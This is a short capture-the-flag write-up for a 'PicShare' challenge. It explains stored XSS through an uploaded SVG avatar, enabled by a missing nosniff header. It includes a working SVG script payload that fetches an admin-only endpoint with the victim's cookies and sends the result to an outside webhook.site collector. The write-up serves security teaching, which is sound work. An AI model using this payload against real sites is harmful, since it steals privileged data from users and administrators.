# PicShare — SVG XSS via MIME Sniffing + Admin Endpoint Exfiltration

## Overview

PicShare is a profile-card service where users can upload an avatar image. A bot with admin cookies reviews links submitted via the **"Report a Profile"** feature. The flag is served at the admin-only endpoint `GET /admin/api/flag`.

---

## Vulnerability

The JS code correctly uses `escapeHtml()` on all user input, preventing classic XSS. The hint was hidden in the footer:

```html
No filters. No rules. No X-Content-Type-Options.
```

The server does not set the `X-Content-Type-Options: nosniff` header, enabling **MIME sniffing**. Additionally, the form accepts `.svg` file uploads. SVG is XML and can contain `<script>` tags — when opened directly in the browser (not embedded in an `<img>` tag), it executes as an active document.

The profile card renders a direct link to the avatar file:

```javascript
const directLink = p.avatar
  ? `<a href="${escapeHtml(p.avatar)}" target="_blank" ...>🔗</a>`
  : '';
```

This link opens the SVG directly in the browser, triggering script execution.

---

## Exploit

### Malicious SVG payload (`avatar.svg`)

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch(`/admin/api/flag`, {credentials: `include`})
    .then(r => r.text())
    .then(d => fetch(`https://webhook.site/<token>/?c=`+d))
  </script>
</svg>
```
Simply convert this code to an SVG file using an online converter: https://www.svgai.org/code-to-svg.